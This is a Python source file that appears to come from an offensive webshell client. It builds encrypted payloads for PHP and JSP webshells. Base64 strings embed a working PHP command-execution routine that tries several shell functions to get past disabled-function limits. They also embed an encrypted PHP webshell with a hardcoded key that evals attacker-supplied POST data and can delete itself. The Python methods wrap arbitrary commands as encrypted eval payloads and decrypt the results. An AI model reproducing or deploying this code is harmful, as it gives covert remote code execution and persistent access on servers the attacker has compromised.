from abc import ABC, abstractmethod
import base64, json
from core.utils import AesEncrypt, AesDecrypt
import subprocess


class Payload(ABC):
    @abstractmethod
    def generate(self):
        pass

class PhpPayload(Payload):
    payload = "QGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIGdldFNhZmVTdHIoJHN0cil7DQogICAgJHMxID0gaWNvbnYoJ3V0Zi04JywnZ2JrLy9JR05PUkUnLCRzdHIpOw0KICAgICRzMCA9IGljb252KCdnYmsnLCd1dGYtOC8vSUdOT1JFJywkczEpOw0KICAgIGlmKCRzMCA9PSAkc3RyKXsNCiAgICAgICAgcmV0dXJuICRzMDsNCiAgICB9ZWxzZXsNCiAgICAgICAgcmV0dXJuIGljb252KCdnYmsnLCd1dGYtOC8vSUdOT1JFJywkc3RyKTsNCiAgICB9DQp9DQpmdW5jdGlvbiBtYWluKCRjbWQpDQp7DQogICAgQHNldF90aW1lX2xpbWl0KDApOw0KICAgIEBpZ25vcmVfdXNlcl9hYm9ydCgxKTsNCiAgICBAaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywgMCk7DQogICAgJHJlc3VsdCA9IGFycmF5KCk7DQogICAgJFBhZHRKbiA9IEBpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpOw0KICAgIGlmICghIGVtcHR5KCRQYWR0Sm4pKSB7DQogICAgICAgICRQYWR0Sm4gPSBwcmVnX3JlcGxhY2UoJy9bLCBdKy8nLCAnLCcsICRQYWR0Sm4pOw0KICAgICAgICAkUGFkdEpuID0gZXhwbG9kZSgnLCcsICRQYWR0Sm4pOw0KICAgICAgICAkUGFkdEpuID0gYXJyYXlfbWFwKCd0cmltJywgJFBhZHRKbik7DQogICAgfSBlbHNlIHsNCiAgICAgICAgJFBhZHRKbiA9IGFycmF5KCk7DQogICAgfQ0KICAgICRjID0gJGNtZDsNCiAgICBpZiAoRkFMU0UgIT09IHN0cnBvcyhzdHJ0b2xvd2VyKFBIUF9PUyksICd3aW4nKSkgew0KICAgICAgICAkYyA9ICRjIC4gIiAyPiYxXG4iOw0KICAgIH0NCiAgICAkSnVlUURCSCA9ICdpc19jYWxsYWJsZSc7DQogICAgJEJ2Y2UgPSAnaW5fYXJyYXknOw0KICAgIGlmICgkSnVlUURCSCgnc3lzdGVtJykgYW5kICEgJEJ2Y2UoJ3N5c3RlbScsICRQYWR0Sm4pKSB7DQogICAgICAgIG9iX3N0YXJ0KCk7DQogICAgICAgIHN5c3RlbSgkYyk7DQogICAgICAgICRrV0pXID0gb2JfZ2V0X2NvbnRlbnRzKCk7DQogICAgICAgIG9iX2VuZF9jbGVhbigpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ3Byb2Nfb3BlbicpIGFuZCAhICRCdmNlKCdwcm9jX29wZW4nLCAkUGFkdEpuKSkgew0KICAgICAgICAkaGFuZGxlID0gcHJvY19vcGVuKCRjLCBhcnJheSgNCiAgICAgICAgICAgIGFycmF5KA0KICAgICAgICAgICAgICAgICdwaXBlJywNCiAgICAgICAgICAgICAgICAncicNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBhcnJheSgNCiAgICAgICAgICAgICAgICAncGlwZScsDQogICAgICAgICAgICAgICAgJ3cnDQogICAgICAgICAgICApLA0KICAgICAgICAgICAgYXJyYXkoDQogICAgICAgICAgICAgICAgJ3BpcGUnLA0KICAgICAgICAgICAgICAgICd3Jw0KICAgICAgICAgICAgKQ0KICAgICAgICApLCAkcGlwZXMpOw0KICAgICAgICAka1dKVyA9IE5VTEw7DQogICAgICAgIHdoaWxlICghIGZlb2YoJHBpcGVzWzFdKSkgew0KICAgICAgICAgICAgJGtXSlcgLj0gZnJlYWQoJHBpcGVzWzFdLCAxMDI0KTsNCiAgICAgICAgfQ0KICAgICAgICBAcHJvY19jbG9zZSgkaGFuZGxlKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdwYXNzdGhydScpIGFuZCAhICRCdmNlKCdwYXNzdGhydScsICRQYWR0Sm4pKSB7DQogICAgICAgIG9iX3N0YXJ0KCk7DQogICAgICAgIHBhc3N0aHJ1KCRjKTsNCiAgICAgICAgJGtXSlcgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICAgICAgb2JfZW5kX2NsZWFuKCk7DQogICAgfSBlbHNlIGlmICgkSnVlUURCSCgnc2hlbGxfZXhlYycpIGFuZCAhICRCdmNlKCdzaGVsbF9leGVjJywgJFBhZHRKbikpIHsNCiAgICAgICAgJGtXSlcgPSBzaGVsbF9leGVjKCRjKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdleGVjJykgYW5kICEgJEJ2Y2UoJ2V4ZWMnLCAkUGFkdEpuKSkgew0KICAgICAgICAka1dKVyA9IGFycmF5KCk7DQogICAgICAgIGV4ZWMoJGMsICRrV0pXKTsNCiAgICAgICAgJGtXSlcgPSBqb2luKGNocigxMCksICRrV0pXKSAuIGNocigxMCk7DQogICAgfSBlbHNlIGlmICgkSnVlUURCSCgnZXhlYycpIGFuZCAhICRCdmNlKCdwb3BlbicsICRQYWR0Sm4pKSB7DQogICAgICAgICRmcCA9IHBvcGVuKCRjLCAncicpOw0KICAgICAgICAka1dKVyA9IE5VTEw7DQogICAgICAgIGlmIChpc19yZXNvdXJjZSgkZnApKSB7DQogICAgICAgICAgICB3aGlsZSAoISBmZW9mKCRmcCkpIHsNCiAgICAgICAgICAgICAgICAka1dKVyAuPSBmcmVhZCgkZnAsIDEwMjQpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIEBwY2xvc2UoJGZwKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAka1dKVyA9IDA7DQogICAgICAgICRyZXN1bHRbInN0YXR1cyJdID0gYmFzZTY0X2VuY29kZSgiZmFpbCIpOw0KICAgICAgICAkcmVzdWx0WyJtc2ciXSA9IGJhc2U2NF9lbmNvZGUoIm5vbmUgb2YgcHJvY19vcGVuL3Bhc3N0aHJ1L3NoZWxsX2V4ZWMvZXhlYy9leGVjIGlzIGF2YWlsYWJsZSIpOw0KICAgICAgICAka2V5ID0gJF9TRVNTSU9OWydrJ107DQogICAgICAgIGVjaG8gZW5jcnlwdChqc29uX2VuY29kZSgkcmVzdWx0KSk7DQogICAgICAgIHJldHVybjsNCiAgICAgICAgDQogICAgfQ0KICAgICRyZXN1bHRbInN0YXR1cyJdID0gYmFzZTY0X2VuY29kZSgic3VjY2VzcyIpOw0KICAgICRyZXN1bHRbIm1zZyJdID0gYmFzZTY0X2VuY29kZShnZXRTYWZlU3RyKCRrV0pXKSk7DQogICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpKTsNCn0NCmZ1bmN0aW9uIEVuY3J5cHQoJGRhdGEpDQp7DQogIEBzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleSA9ICRfU0VTU0lPTlsnayddOw0KCWlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpDQogICAgCXsNCiAgICAJCWZvcigkaT0wOyRpPHN0cmxlbigkZGF0YSk7JGkrKykgew0KICAgIAkJCSAkZGF0YVskaV0gPSAkZGF0YVskaV1eJGtleVskaSsxJjE1XTsNCiAgICAJCQl9DQoJCQlyZXR1cm4gJGRhdGE7DQogICAgCX0NCiAgICBlbHNlDQogICAgCXsNCiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsNCiAgICAJfQ0KfQ0KJGNtZD0iQ09NTUFORCI7JGNtZD1iYXNlNjRfZGVjb2RlKCRjbWQpO21haW4oJGNtZCk7"
    webshell = "PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQoka2V5PSJlNDVlMzI5ZmViNWQ5MjViIjsNCiRfU0VTU0lPTlsnayddPSRrZXk7DQpzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7DQokcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCmlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpDQp7DQoJJHQ9ImJhc2U2NCIuIl9kZWNvZGUiOw0KCSRwb3N0PSR0KCRwb3N0LiIiKTsNCglmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsNCgkJJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07DQoJfQ0KfQ0KZWxzZQ0Kew0KCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOw0KfQ0KJGFycj1leHBsb2RlKCd8JywkcG9zdCk7DQokZnVuYz0kYXJyWzBdOw0KJHBhcmFtcz0kYXJyWzFdOw0KaWYoIXN0cmNtcCgkZnVuYywiZGVsZXRlIikpew0KCXVubGluayhfX0ZJTEVfXyk7ZWNobyAnZGVsZXRlZCc7ZGllKDApOw0KfQ0KY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQ0KQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Pg=="

    def generate(self, cmd, key=b'rebeyond'):
        command = base64.b64encode(cmd.strip().encode())
        payload = base64.b64decode(self.payload).replace(b'COMMAND', command)
        payload = base64.b64encode(payload).decode()
        payload = f"assert|eval(base64_decode('{payload}'));"
        data = base64.b64encode(AesEncrypt(key, payload.encode(), 'CBC'))
        return data

    def generate_clean_payload(self, key=b'rebeyond'):
        payload = b'delete'
        payload = base64.b64encode(payload).decode()
        payload = f"delete|eval(base64_decode('{payload}'));"
        data = base64.b64encode(AesEncrypt(key, payload.encode(), 'CBC'))
        return data

    def get_result(self, res, key=b'rebeyond'):
        try:
            if b'deleted' in res.content:
                return True
            content = res.content
            print(res.text)
            result = json.loads(AesDecrypt(key, base64.b64decode(content), 'CBC'))
            print(result)
            if base64.b64decode(result['status']) != b'success':
                return b'command execution failed'
            return base64.b64decode(result['msg'])
        except Exception as e:
            print(e)
            return None


class JspPayload(Payload):
    def generate(self, cmd, bin="cmd.exe", output='payload.bin', key=b'sky'):
        if bin == "cmd.exe":
            cmd = f'java -cp lib/asm-9.0.jar;. com.txws.CMD "{bin}" "{cmd}" "{output}"'
        else:
            cmd = f'java -cp lib/asm-9.0.jar:. com.txws.CMD "{bin}" "{cmd}" "{output}"'

        try:
            subprocess.check_call(cmd, shell=True)
        except Exception as e:
            raise e

        with open(f"{output}", 'rb') as f:
            payload = f.read()
        payload = AesEncrypt(key, payload)
        return base64.b64encode(payload)
    
    def get_result(self, res, key=b'sky'):
        try:
            data = base64.b64decode(res.content)
            return AesDecrypt(key, data)
        except:
            return None

    